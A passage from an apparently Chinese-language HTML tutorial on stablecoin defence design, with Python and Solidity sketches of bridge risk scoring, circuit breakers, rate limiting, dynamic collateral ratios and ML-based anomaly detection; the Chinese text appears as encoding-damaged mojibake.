        for (uint i = 0; i < actionCount; i++) {
            executeRebalance(actions[i]);
        }
        
        return actions;
    }
}</code></pre>
            </div>
        </div>
        
        <h5>æ¡¥æ¥é£é™©ç¼“é‡Šæœºåˆ¶</h5>
        <div class="code-block">
            <div class="code-header">
                Python ä»£ç  <span class="toggle-icon">â–¼</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-python">class BridgeRiskMitigation:
    """è·¨é“¾æ¡¥é£é™©ç¼“é‡Šç­–ç•¥"""
    
    def __init__(self):
        self.risk_params = {
            'max_bridge_exposure': 0.2,  # å•ä¸ªæ¡¥æœ€å¤§æš´éœ²
            'proof_delay': 3600,         # è¯æ˜å»¶è¿Ÿï¼ˆç§’ï¼‰
            'emergency_pause_threshold': 0.05,  # ç´§æ€¥æš‚åœé˜ˆå€¼
            'audit_frequency': 30 * 24 * 3600   # å®¡è®¡é¢‘ç‡
        }
    
    def assess_bridge_security(self, bridge_data: dict) -> dict:
        """è¯„ä¼°è·¨é“¾æ¡¥å®‰å…¨æ€§"""
        
        security_score = 100
        risk_factors = []
        
        # 1. éªŒè¯æœºåˆ¶è¯„ä¼°
        if bridge_data['validator_count'] < 7:
            security_score -= 20
            risk_factors.append('Insufficient validators')
        
        if bridge_data['validator_stake'] < 1000000:  # $1M
            security_score -= 15
            risk_factors.append('Low validator stake')
        
        # 2. ä»£ç å®¡è®¡çŠ¶æ€
        days_since_audit = (datetime.now() - 
                          bridge_data['last_audit_date']).days
        if days_since_audit > 180:
            security_score -= 25
            risk_factors.append('Outdated audit')
        
        # 3. å†å²è¡¨ç°
        if bridge_data['historical_hacks'] > 0:
            security_score -= bridge_data['historical_hacks'] * 15
            risk_factors.append(f"{bridge_data['historical_hacks']} past incidents")
        
        # 4. å»ä¸­å¿ƒåŒ–ç¨‹åº¦
        decentralization_score = self.calculate_decentralization(bridge_data)
        if decentralization_score < 50:
            security_score -= 20
            risk_factors.append('Centralization risk')
        
        return {
            'security_score': max(0, security_score),
            'risk_factors': risk_factors,
            'recommended_exposure': self.calculate_safe_exposure(security_score),
            'monitoring_frequency': self.determine_monitoring_frequency(security_score)
        }
    
    def design_circuit_breaker(self, stablecoin_config: dict) -> dict:
        """è®¾è®¡è·¨é“¾ç†”æ–­æœºåˆ¶"""
        
        return {
            'triggers': {
                'supply_deviation': {
                    'threshold': 0.05,  # 5%ä¾›åº”é‡åå·®
                    'action': 'pause_bridge',
                    'duration': 3600
                },
                'rapid_minting': {
                    'threshold': 0.02,  # 2%æ¯å°æ—¶
                    'action': 'rate_limit',
                    'cooldown': 7200
                },
                'proof_failure': {
                    'consecutive_failures': 3,
                    'action': 'emergency_pause',
                    'requires_governance': True
                },
                'oracle_divergence': {
                    'threshold': 0.03,  # 3%ä»·æ ¼å·®å¼‚
                    'action': 'suspend_chain',
                    'investigation_period': 3600
                }
            },
            'recovery_procedures': {
                'verification_steps': [
                    'audit_bridge_state',
                    'reconcile_supplies',
                    'verify_collateral',
                    'governance_approval'
                ],
                'gradual_resumption': {
                    'initial_limit': '10% of normal',
                    'increment': '10% per hour',
                    'monitoring_period': 24 * 3600
                }
            }
        }
    
    def simulate_bridge_attack(self, attack_scenario: dict) -> dict:
        """æ¨¡æ‹Ÿè·¨é“¾æ¡¥æ”»å‡»åœºæ™¯"""
        
        results = {
            'attack_type': attack_scenario['type'],
            'success_probability': 0,
            'potential_damage': 0,
            'detection_time': 0,
            'recovery_cost': 0
        }
        
        if attack_scenario['type'] == 'infinite_mint':
            # æ— é™é“¸é€ æ”»å‡»
            if attack_scenario['bridge_security'] < 60:
                results['success_probability'] = 0.3
                results['potential_damage'] = float('inf')
                results['detection_time'] = 3600  # 1å°æ—¶
                
        elif attack_scenario['type'] == 'double_spend':
            # åŒèŠ±æ”»å‡»
            results['success_probability'] = 0.1 * (1 - attack_scenario['finality_time'] / 3600)
            results['potential_damage'] = attack_scenario['transaction_size'] * 2
            results['detection_time'] = attack_scenario['finality_time']
            
        elif attack_scenario['type'] == 'validator_collusion':
            # éªŒè¯è€…åˆè°‹
            colluding_stake = attack_scenario['colluding_validators'] / attack_scenario['total_validators']
            if colluding_stake > 0.67:
                results['success_probability'] = 0.9
                results['potential_damage'] = attack_scenario['bridge_tvl']
            
        # è®¡ç®—æ¢å¤æˆæœ¬
        results['recovery_cost'] = self.estimate_recovery_cost(results)
        
        return results
    
    def create_unified_monitoring(self) -> dict:
        """åˆ›å»ºç»Ÿä¸€ç›‘æ§ç³»ç»Ÿ"""
        
        return {
            'real_time_metrics': {
                'supply_tracking': {
                    'native_chain': 'track total minted',
                    'bridged_chains': 'track circulating supply',
                    'reconciliation': 'every 10 minutes'
                },
                'bridge_health': {
                    'validator_status': 'check every block',
                    'proof_validity': 'verify all submissions',
                    'tvl_monitoring': 'track locked assets'
                },
                'anomaly_detection': {
                    'ml_model': 'LSTM for pattern recognition',
                    'threshold_alerts': 'configurable per chain',
                    'correlation_analysis': 'cross-chain patterns'
                }
            },
            'automated_responses': {
                'minor_deviation': 'increase monitoring',
                'major_deviation': 'pause affected bridge',
                'critical_event': 'global emergency pause'
            },
            'reporting': {
                'public_dashboard': 'real-time stats',
                'risk_reports': 'daily summaries',
                'incident_logs': 'detailed post-mortems'
            }
        }
</code></pre>
            </div>
        </div>
        
        <div class="info-box">
            <h5>ğŸ“Š è·¨é“¾æ¡¥é£é™©ç®¡ç†æœ€ä½³å®è·µ</h5>
            <ul>
                <li><strong>å¤šé‡éªŒè¯ï¼š</strong>ç»“åˆå¯†ç å­¦è¯æ˜ã€ç»æµæ¿€åŠ±å’Œæ—¶é—´å»¶è¿Ÿ</li>
                <li><strong>æ¸è¿›å¼éƒ¨ç½²ï¼š</strong>æ–°æ¡¥å…ˆè®¾ç½®ä½é¢åº¦é™åˆ¶ï¼Œé€æ­¥æå‡</li>
                <li><strong>ç‹¬ç«‹å®¡è®¡ï¼š</strong>æ¯ä¸ªæ¡¥æ¥ç‰ˆæœ¬éœ€è¦ç‹¬ç«‹çš„å®‰å…¨å®¡è®¡</li>
                <li><strong>åº”æ€¥å‚¨å¤‡ï¼š</strong>ä¸ºæ¯ä¸ªæ¡¥ç»´æŠ¤ç‹¬ç«‹çš„ä¿é™©åŸºé‡‘</li>
                <li><strong>ä¾›åº”é‡ä¸Šé™ï¼š</strong>é™åˆ¶æ¯æ¡é“¾ä¸Šçš„æœ€å¤§é“¸é€ é‡</li>
                <li><strong>å®šæœŸå¯¹è´¦ï¼š</strong>è‡ªåŠ¨åŒ–çš„è·¨é“¾ä¾›åº”é‡æ ¸å¯¹æœºåˆ¶</li>
            </ul>
        </div>

        <h3 id="defense-mechanisms">10.3 é˜²å¾¡æœºåˆ¶è®¾è®¡</h3>
        
        <div class="intro-box" style="background-color: #f0f9ff; padding: 20px; border-radius: 10px; margin: 20px 0;">
            <h4>ğŸ›¡ï¸ ä¸»åŠ¨é˜²å¾¡ï¼šé¢„é˜²èƒœäºæ²»ç–—</h4>
            <p>é˜²å¾¡æœºåˆ¶è®¾è®¡æ˜¯ç¨³å®šå¸ç³»ç»Ÿçš„"å…ç–«ç³»ç»Ÿ"ã€‚å¥½çš„é˜²å¾¡æœºåˆ¶ä¸æ˜¯ç®€å•åœ°é˜»æŒ¡æ”»å‡»ï¼Œè€Œæ˜¯è®©æ”»å‡»å˜å¾—ä¸ç»æµã€ä¸å¯èƒ½æˆ–è€…é£é™©è¿‡é«˜ã€‚å®ƒä»¬æ—¢è¦ä¿æŠ¤ç³»ç»Ÿå®‰å…¨ï¼Œåˆè¦ä¿æŒç”¨æˆ·ä½“éªŒçš„æµç•…æ€§ã€‚</p>
            
            <div style="background-color: #e0f2fe; padding: 15px; border-radius: 8px; margin: 15px 0;">
                <h5>ğŸ¯ ç°ä»£é˜²å¾¡æœºåˆ¶çš„è®¾è®¡åŸåˆ™ï¼š</h5>
                <ol>
                    <li><strong>åˆ†å±‚é˜²å¾¡</strong>ï¼šå¤šé“é˜²çº¿ï¼Œä»»ä½•å•ç‚¹å¤±æ•ˆéƒ½ä¸è‡´å‘½</li>
                    <li><strong>è‡ªé€‚åº”è°ƒæ•´</strong>ï¼šæ ¹æ®å¨èƒçº§åˆ«åŠ¨æ€è°ƒæ•´é˜²å¾¡å¼ºåº¦</li>
                    <li><strong>æœ€å°æ‘©æ“¦</strong>ï¼šæ­£å¸¸ç”¨æˆ·å‡ ä¹æ„Ÿå—ä¸åˆ°é˜²å¾¡æœºåˆ¶çš„å­˜åœ¨</li>
                    <li><strong>å¯è§‚æµ‹æ€§</strong>ï¼šæ‰€æœ‰é˜²å¾¡åŠ¨ä½œéƒ½æœ‰æ¸…æ™°çš„æ—¥å¿—å’ŒæŒ‡æ ‡</li>
                </ol>
            </div>
        </div>
        
        <div class="info-box">
            <h4>ğŸ—ï¸ é˜²å¾¡æœºåˆ¶ç±»å‹ä¸é€‚ç”¨åœºæ™¯</h4>
            <table style="width: 100%; border-collapse: collapse;">
                <thead>
                    <tr style="background-color: #f3f4f6;">
                        <th style="border: 1px solid #e5e7eb; padding: 12px;">é˜²å¾¡ç±»å‹</th>
                        <th style="border: 1px solid #e5e7eb; padding: 12px;">ä¸»è¦åŠŸèƒ½</th>
                        <th style="border: 1px solid #e5e7eb; padding: 12px;">é€‚ç”¨æ”»å‡»</th>
                        <th style="border: 1px solid #e5e7eb; padding: 12px;">ç”¨æˆ·å½±å“</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;"><strong>é€Ÿç‡é™åˆ¶</strong></td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">é™åˆ¶æ“ä½œé¢‘ç‡</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">é—ªç”µè´·ã€å¤§é‡äº¤æ˜“</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">ğŸŸ¢ æä½</td>
                    </tr>
                    <tr style="background-color: #f9fafb;">
                        <td style="border: 1px solid #e5e7eb; padding: 12px;"><strong>å»¶æ—¶æ‰§è¡Œ</strong></td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">å…³é”®æ“ä½œå»¶è¿Ÿ</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">æ²»ç†æ”»å‡»ã€å¿«é€Ÿå¥—åˆ©</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">ğŸŸ¡ ä¸­ç­‰</td>
                    </tr>
                    <tr>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;"><strong>ä»·æ ¼ç†”æ–­</strong></td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">å¼‚å¸¸ä»·æ ¼æš‚åœ</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">é¢„è¨€æœºæ“çºµ</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">ğŸŸ  é«˜</td>
                    </tr>
                    <tr style="background-color: #f9fafb;">
                        <td style="border: 1px solid #e5e7eb; padding: 12px;"><strong>åŠ¨æ€è´¹ç”¨</strong></td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">æ ¹æ®é£é™©è°ƒæ•´æˆæœ¬</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">MEVæ”»å‡»ã€å¥—åˆ©</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">ğŸŸ¡ ä¸­ç­‰</td>
                    </tr>
                    <tr>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;"><strong>å¤šç­¾éªŒè¯</strong></td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">åˆ†å¸ƒå¼æˆæƒ</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">å†…éƒ¨æ”»å‡»ã€æƒé™æ»¥ç”¨</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">ğŸŸ¢ æ— </td>
                    </tr>
                    <tr style="background-color: #f9fafb;">
                        <td style="border: 1px solid #e5e7eb; padding: 12px;"><strong>AIç›‘æ§</strong></td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">å¼‚å¸¸è¡Œä¸ºæ£€æµ‹</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">å¤æ‚æ”»å‡»ã€æœªçŸ¥æ”»å‡»</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">ğŸŸ¢ æ— </td>
                    </tr>
                </tbody>
            </table>
        </div>
        
        <div class="example-box" style="background-color: #fef3c7; margin: 20px 0;">
            <h4>ğŸ’¡ é˜²å¾¡æœºåˆ¶çš„æƒè¡¡è‰ºæœ¯</h4>
            <p>è®¾è®¡é˜²å¾¡æœºåˆ¶æ˜¯ä¸€é—¨è‰ºæœ¯ï¼Œéœ€è¦åœ¨å®‰å…¨æ€§å’Œå¯ç”¨æ€§ä¹‹é—´æ‰¾åˆ°å¹³è¡¡ï¼š</p>
            
            <div style="background-color: #fef9e7; padding: 15px; border-radius: 8px;">
                <h5>ç»å…¸æƒè¡¡æ¡ˆä¾‹ï¼š</h5>
                <ul>
                    <li><strong>MakerDAO</strong>ï¼šä¸¥æ ¼çš„æ²»ç†å»¶æ—¶æœºåˆ¶ï¼Œé«˜å®‰å…¨ä½†å“åº”æ…¢</li>
                    <li><strong>USDC</strong>ï¼šä¸­å¿ƒåŒ–æ§åˆ¶ï¼Œå¿«é€Ÿå“åº”ä½†å­˜åœ¨å®¡æŸ¥é£é™©</li>
                    <li><strong>LUSD</strong>ï¼šçº¯ç®—æ³•æœºåˆ¶ï¼Œå»ä¸­å¿ƒåŒ–ä½†æŠ—æ”»å‡»èƒ½åŠ›æœ‰é™</li>
                    <li><strong>FRAX</strong>ï¼šæ··åˆæœºåˆ¶ï¼Œå¹³è¡¡ä½†å¤æ‚æ€§å¢åŠ </li>
                </ul>
            </div>
        </div>
        
        <div class="theory-section">
            <h4>10.3.0 2024å¹´å‰æ²¿é˜²å¾¡æœºåˆ¶</h4>
            
            <h5>é€Ÿç‡é™åˆ¶å™¨ï¼ˆRate Limiterï¼‰å®ç°</h5>
            <p>åŸºäºToken Bucketç®—æ³•çš„ç²¾ç¡®å®ç°ï¼Œé™åˆ¶å•ä½æ—¶é—´å†…çš„æ“ä½œé¢‘ç‡ï¼š</p>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>â–¶ Solidity: Token Bucketé€Ÿç‡é™åˆ¶å™¨</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// Token Bucketé€Ÿç‡é™åˆ¶å™¨
contract RateLimiter {
    struct Bucket {
        uint256 tokens;      // å½“å‰å¯ç”¨ä»¤ç‰Œ
        uint256 capacity;    // æœ€å¤§å®¹é‡
        uint256 refillRate;  // æ¯ç§’è¡¥å……é€Ÿç‡
        uint256 lastRefill;  // ä¸Šæ¬¡è¡¥å……æ—¶é—´
    }
    
    mapping(address => Bucket) public userBuckets;
    mapping(bytes32 => Bucket) public operationBuckets;
    
    // å…¨å±€é€Ÿç‡é™åˆ¶
    Bucket public globalBucket;
    
    function _consumeTokens(
        Bucket storage bucket,
        uint256 amount
    ) private returns (bool) {
        // è¡¥å……ä»¤ç‰Œ
        uint256 elapsed = block.timestamp - bucket.lastRefill;
        uint256 refillAmount = elapsed * bucket.refillRate;
        
        bucket.tokens = min(
            bucket.capacity,
            bucket.tokens + refillAmount
        );
        bucket.lastRefill = block.timestamp;
        
        // æ£€æŸ¥æ˜¯å¦æœ‰è¶³å¤Ÿä»¤ç‰Œ
        if (bucket.tokens >= amount) {
            bucket.tokens -= amount;
            return true;
        }
        
        return false;
    }
    
    modifier rateLimited(uint256 cost) {
        require(
            _consumeTokens(userBuckets[msg.sender], cost),
            "User rate limit exceeded"
        );
        
        require(
            _consumeTokens(globalBucket, cost),
            "Global rate limit exceeded"
        );
        _;
    }
    
    // åŠ¨æ€è°ƒæ•´é€Ÿç‡é™åˆ¶
    function adjustRateLimits(uint256 marketVolatility) external {
        if (marketVolatility > HIGH_VOLATILITY_THRESHOLD) {
            // é«˜æ³¢åŠ¨æœŸé—´å‡å°‘é€Ÿç‡
            globalBucket.refillRate = globalBucket.refillRate / 2;
            globalBucket.capacity = globalBucket.capacity / 2;
        } else if (marketVolatility < LOW_VOLATILITY_THRESHOLD) {
            // ä½æ³¢åŠ¨æœŸé—´æ¢å¤æ­£å¸¸
            globalBucket.refillRate = DEFAULT_REFILL_RATE;
            globalBucket.capacity = DEFAULT_CAPACITY;
        }
    }
}</code></pre>
                </div>
            </div>
            
            <h5>åŠ¨æ€æŠµæŠ¼ç‡è°ƒæ•´</h5>
            <p>åŸºäºå¸‚åœºæ¡ä»¶å®æ—¶è°ƒæ•´æŠµæŠ¼ç‡è¦æ±‚ï¼š</p>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>â–¶ Solidity: åŠ¨æ€æŠµæŠ¼ç‡ç³»ç»Ÿ</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// åŠ¨æ€æŠµæŠ¼ç‡è°ƒæ•´ç³»ç»Ÿ
contract DynamicCollateralRatio {
    uint256 constant BASE_RATIO = 15000; // 150%åŸºç¡€æŠµæŠ¼ç‡
    uint256 constant MIN_RATIO = 11000;  // 110%æœ€ä½æŠµæŠ¼ç‡
    uint256 constant MAX_RATIO = 20000;  // 200%æœ€é«˜æŠµæŠ¼ç‡
    
    struct MarketConditions {
        uint256 volatility;      // æ³¢åŠ¨ç‡ï¼ˆåŸºç‚¹ï¼‰
        uint256 liquidity;       // æµåŠ¨æ€§æ·±åº¦
        uint256 utilizationRate; // ä½¿ç”¨ç‡
        uint256 defaultRate;     // è¿çº¦ç‡
    }
    
    // è®¡ç®—åŠ¨æ€æŠµæŠ¼ç‡
    function calculateDynamicRatio(
        address collateralAsset,
        MarketConditions memory conditions
    ) public pure returns (uint256) {
        uint256 ratio = BASE_RATIO;
        
        // åŸºäºæ³¢åŠ¨ç‡è°ƒæ•´
        // volatilityä»¥åŸºç‚¹è¡¨ç¤ºï¼Œ1000 = 10%
        if (conditions.volatility > 2000) { // >20%æ³¢åŠ¨
            ratio += (conditions.volatility - 2000) * 5; // æ¯1%é¢å¤–æ³¢åŠ¨å¢åŠ 5åŸºç‚¹
        }
        
        // åŸºäºæµåŠ¨æ€§è°ƒæ•´
        // æµåŠ¨æ€§ä¸è¶³æ—¶æé«˜è¦æ±‚
        if (conditions.liquidity < 1000000 * 1e18) { // <100ä¸‡ç¾å…ƒ
            uint256 liquidityPenalty = (1000000 * 1e18 - conditions.liquidity) / 1e16;
            ratio += liquidityPenalty;
        }
        
        // åŸºäºä½¿ç”¨ç‡è°ƒæ•´
        // é«˜ä½¿ç”¨ç‡å¢åŠ é£é™©
        if (conditions.utilizationRate > 8000) { // >80%
            ratio += (conditions.utilizationRate - 8000) * 2;
        }
        
        // åŸºäºå†å²è¿çº¦ç‡
        ratio += conditions.defaultRate * 10;
        
        // ç¡®ä¿åœ¨åˆç†èŒƒå›´å†…
        return max(MIN_RATIO, min(MAX_RATIO, ratio));
    }
    
    // å®é™…åº”ç”¨ç¤ºä¾‹
    function applyDynamicRatio(
        address user,
        address collateral,
        uint256 debtAmount
    ) external view returns (uint256 requiredCollateral) {
        MarketConditions memory conditions = getMarketConditions(collateral);
        uint256 ratio = calculateDynamicRatio(collateral, conditions);
        
        // è®¡ç®—æ‰€éœ€æŠµæŠ¼å“
        requiredCollateral = (debtAmount * ratio) / 10000;
        
        // å¯¹é«˜é£é™©ç”¨æˆ·çš„é¢å¤–è¦æ±‚
        if (getUserRiskScore(user) > 70) {
            requiredCollateral = (requiredCollateral * 110) / 100; // +10%
        }
        
        return requiredCollateral;
    }
}</code></pre>
                </div>
            </div>
            
            <h5>AIé©±åŠ¨çš„å¼‚å¸¸æ£€æµ‹ç³»ç»Ÿ</h5>
            <p>ä½¿ç”¨æœºå™¨å­¦ä¹ æ¨¡å‹å®æ—¶æ£€æµ‹å¼‚å¸¸è¡Œä¸ºï¼š</p>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>â–¶ Python: AIå¼‚å¸¸æ£€æµ‹ç³»ç»Ÿ</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python">import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
import torch
import torch.nn as nn
from typing import Dict, List, Tuple

class StablecoinAnomalyDetector:
    """ç¨³å®šå¸ç³»ç»Ÿçš„AIå¼‚å¸¸æ£€æµ‹å™¨"""
    
    def __init__(self):
        self.isolation_forest = IsolationForest(
            contamination=0.1,
            random_state=42
        )
        self.scaler = StandardScaler()
        self.gnn_model = GraphNeuralNetwork()
        self.vae_model = VariationalAutoencoder()
        
    def extract_transaction_features(self, tx: Dict) -> np.ndarray:
        """æå–äº¤æ˜“ç‰¹å¾"""
        features = [
            tx['amount'],
            tx['gas_price'],
            tx['nonce'],
            tx['time_since_last_tx'],
            tx['recipient_tx_count'],
            tx['sender_balance'],
            tx['recipient_balance'],
            self.calculate_velocity(tx['sender']),
            self.calculate_concentration(tx['sender']),
            self.detect_pattern_similarity(tx)
        ]
        return np.array(features)
    
    def detect_anomalies_isolation_forest(self, 
                                        transactions: List[Dict]) -> np.ndarray:
        """ä½¿ç”¨Isolation Forestæ£€æµ‹å¼‚å¸¸"""
        features = np.array([
            self.extract_transaction_features(tx) for tx in transactions
        ])
        
        # æ ‡å‡†åŒ–
        features_scaled = self.scaler.fit_transform(features)
        
        # é¢„æµ‹å¼‚å¸¸
        predictions = self.isolation_forest.fit_predict(features_scaled)
        
        # -1è¡¨ç¤ºå¼‚å¸¸ï¼Œ1è¡¨ç¤ºæ­£å¸¸
        return predictions
    
    def detect_sybil_attacks_gnn(self, 
                                address_graph: nx.Graph) -> Dict[str, float]:
        """ä½¿ç”¨å›¾ç¥ç»ç½‘ç»œæ£€æµ‹å¥³å·«æ”»å‡»"""
        # å°†å›¾è½¬æ¢ä¸ºPyTorchå‡ ä½•æ ¼å¼
        edge_index, node_features = self.graph_to_pytorch(address_graph)
        
        # GNNæ¨ç†
        with torch.no_grad():
            node_embeddings = self.gnn_model(node_features, edge_index)
            sybil_scores = self.gnn_model.classify(node_embeddings)
        
        # è¿”å›æ¯ä¸ªåœ°å€çš„å¥³å·«æ”»å‡»æ¦‚ç‡
        return {
            node: float(score) 
            for node, score in zip(address_graph.nodes(), sybil_scores)
        }
    
    def detect_market_manipulation_vae(self, 
                                     market_data: np.ndarray) -> float:
        """ä½¿ç”¨VAEæ£€æµ‹å¸‚åœºæ“çºµ"""
        # ç¼–ç å¸‚åœºæ•°æ®
        with torch.no_grad():
            encoded = self.vae_model.encode(
                torch.FloatTensor(market_data)
            )
            reconstructed = self.vae_model.decode(encoded)
        
        # è®¡ç®—é‡æ„è¯¯å·®
        reconstruction_error = torch.mean(
            (torch.FloatTensor(market_data) - reconstructed) ** 2
        )
        
        # é«˜é‡æ„è¯¯å·®è¡¨ç¤ºå¼‚å¸¸
        anomaly_score = float(reconstruction_error)
        
        return anomaly_score
    
    def reinforcement_learning_defense(self, 
                                     state: np.ndarray) -> Dict[str, float]:
        """ä½¿ç”¨å¼ºåŒ–å­¦ä¹ ä¼˜åŒ–é˜²å¾¡å‚æ•°"""
        # çŠ¶æ€ï¼š[volatility, volume, liquidity, attack_signals]
        # åŠ¨ä½œï¼šè°ƒæ•´å„ç§é˜²å¾¡å‚æ•°
        
        # è¿™é‡Œä½¿ç”¨é¢„è®­ç»ƒçš„RLç­–ç•¥
        action = self.rl_agent.select_action(state)
        
        return {
            'fee_adjustment': action[0],
            'collateral_ratio_adjustment': action[1],
            'rate_limit_adjustment': action[2],
            'circuit_breaker_threshold': action[3]
        }

class GraphNeuralNetwork(nn.Module):
    """ç”¨äºæ£€æµ‹åœ°å€é›†ç¾¤çš„GNN"""
    
    def __init__(self, input_dim=10, hidden_dim=64, output_dim=32):
        super().__init__()
        self.conv1 = GCNConv(input_dim, hidden_dim)
        self.conv2 = GCNConv(hidden_dim, hidden_dim)
        self.conv3 = GCNConv(hidden_dim, output_dim)
        self.classifier = nn.Linear(output_dim, 1)
        
    def forward(self, x, edge_index):
        x = F.relu(self.conv1(x, edge_index))
        x = F.dropout(x, p=0.5, training=self.training)
        x = F.relu(self.conv2(x, edge_index))
        x = F.dropout(x, p=0.5, training=self.training)
        x = self.conv3(x, edge_index)
        return x
    
    def classify(self, embeddings):
        return torch.sigmoid(self.classifier(embeddings))

class VariationalAutoencoder(nn.Module):
    """ç”¨äºæ£€æµ‹å¸‚åœºå¼‚å¸¸çš„VAE"""
    
    def __init__(self, input_dim=20, latent_dim=5):
        super().__init__()
        
        # ç¼–ç å™¨
        self.encoder = nn.Sequential(
            nn.Linear(input_dim, 64),
            nn.ReLU(),
            nn.Linear(64, 32),
            nn.ReLU()
        )
        
        self.fc_mu = nn.Linear(32, latent_dim)
        self.fc_var = nn.Linear(32, latent_dim)
        
        # è§£ç å™¨
        self.decoder = nn.Sequential(
            nn.Linear(latent_dim, 32),
            nn.ReLU(),
            nn.Linear(32, 64),
            nn.ReLU(),
            nn.Linear(64, input_dim)
        )
    
    def encode(self, x):
        h = self.encoder(x)
        return self.fc_mu(h), self.fc_var(h)
    
    def reparameterize(self, mu, logvar):
        std = torch.exp(0.5 * logvar)
        eps = torch.randn_like(std)
        return mu + eps * std
    
    def decode(self, z):
        return self.decoder(z)
    
    def forward(self, x):
        mu, logvar = self.encode(x)
        z = self.reparameterize(mu, logvar)
        return self.decode(z), mu, logvar

# å®é™…åº”ç”¨
detector = StablecoinAnomalyDetector()

# æ£€æµ‹äº¤æ˜“å¼‚å¸¸
transactions = load_recent_transactions()
anomalies = detector.detect_anomalies_isolation_forest(transactions)

# æ£€æµ‹å¥³å·«æ”»å‡»
address_graph = build_address_interaction_graph()
sybil_scores = detector.detect_sybil_attacks_gnn(address_graph)

# æ£€æµ‹å¸‚åœºæ“çºµ
market_data = get_market_metrics()
manipulation_score = detector.detect_market_manipulation_vae(market_data)

# è‡ªåŠ¨è°ƒæ•´é˜²å¾¡å‚æ•°
current_state = get_system_state()
defense_adjustments = detector.reinforcement_learning_defense(current_state)</code></pre>
                </div>
            </div>
            
            <h4>10.3.1 åŠ¨æ€å‚æ•°è°ƒæ•´</h4>
            
            <div class="code-block">
                <div class="code-header">
                    Solidity ä»£ç  <span class="toggle-icon">â–¼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// è‡ªé€‚åº”é˜²å¾¡ç³»ç»Ÿ
contract AdaptiveDefenseSystem {
    
    // é£é™©å‚æ•°
    struct RiskParameters {
        uint256 maxSlippage;          // æœ€å¤§æ»‘ç‚¹
        uint256 maxTransactionSize;    // æœ€å¤§äº¤æ˜“è§„æ¨¡
        uint256 cooldownPeriod;        // å†·å´æœŸ
        uint256 liquidationThreshold;  // æ¸…ç®—é˜ˆå€¼
        uint256 borrowingRate;         // å€Ÿè´·åˆ©ç‡
    }
    
    RiskParameters public params;
    
    // å¸‚åœºçŠ¶æ€æŒ‡æ ‡
    struct MarketMetrics {
        uint256 volatility;
        uint256 liquidity;
        uint256 utilizationRate;
        uint256 defaultRate;
        uint256 lastUpdateTime;
    }
    
    MarketMetrics public metrics;
    
    // åŠ¨æ€è°ƒæ•´å‚æ•°
    function updateRiskParameters() external {
        require(
            block.timestamp >= metrics.lastUpdateTime + 1 hours,
            "Too soon to update"
        );
        
        // åŸºäºå¸‚åœºçŠ¶æ€è®¡ç®—é£é™©ç­‰çº§
        uint256 riskScore = calculateRiskScore();
        
        // é«˜é£é™©çŠ¶æ€ï¼šæ”¶ç´§å‚æ•°
        if (riskScore > 80) {
            params.maxSlippage = 100;           // 1%
            params.maxTransactionSize = 100000 * 1e18;  // 10ä¸‡
            params.cooldownPeriod = 1 hours;
            params.liquidationThreshold = 8500; // 85%
            params.borrowingRate = 2000;        // 20% APR
        }
        // ä¸­ç­‰é£é™©çŠ¶æ€
        else if (riskScore > 50) {
            params.maxSlippage = 300;           // 3%
            params.maxTransactionSize = 500000 * 1e18;  // 50ä¸‡
            params.cooldownPeriod = 30 minutes;
            params.liquidationThreshold = 8000; // 80%
            params.borrowingRate = 1000;        // 10% APR
        }
        // ä½é£é™©çŠ¶æ€ï¼šæ”¾æ¾å‚æ•°
        else {
            params.maxSlippage = 500;           // 5%
            params.maxTransactionSize = 1000000 * 1e18; // 100ä¸‡
            params.cooldownPeriod = 10 minutes;
            params.liquidationThreshold = 7500; // 75%
            params.borrowingRate = 500;         // 5% APR
        }
        
        metrics.lastUpdateTime = block.timestamp;
        emit ParametersUpdated(riskScore, params);
    }
    
    function calculateRiskScore() internal view returns (uint256) {
        uint256 score = 0;
        
        // æ³¢åŠ¨æ€§è¯„åˆ†ï¼ˆ0-40åˆ†ï¼‰
        score += min(40, metrics.volatility / 100);
        
        // æµåŠ¨æ€§è¯„åˆ†ï¼ˆ0-30åˆ†ï¼‰
        score += 30 - min(30, metrics.liquidity / 1000000);
        
        // åˆ©ç”¨ç‡è¯„åˆ†ï¼ˆ0-20åˆ†ï¼‰
        if (metrics.utilizationRate > 9000) {  // >90%
            score += 20;
        } else if (metrics.utilizationRate > 8000) {  // >80%
            score += 10;
        }
        
        // è¿çº¦ç‡è¯„åˆ†ï¼ˆ0-10åˆ†ï¼‰
        score += min(10, metrics.defaultRate * 10);
        
        return score;
    }
}

// ç†”æ–­æœºåˆ¶
contract CircuitBreakerV2 {
    enum BreakLevel { NONE, YELLOW, ORANGE, RED }
    BreakLevel public currentLevel = BreakLevel.NONE;
    
    uint256 public constant YELLOW_THRESHOLD = 5;   // 5%ä»·æ ¼åç¦»
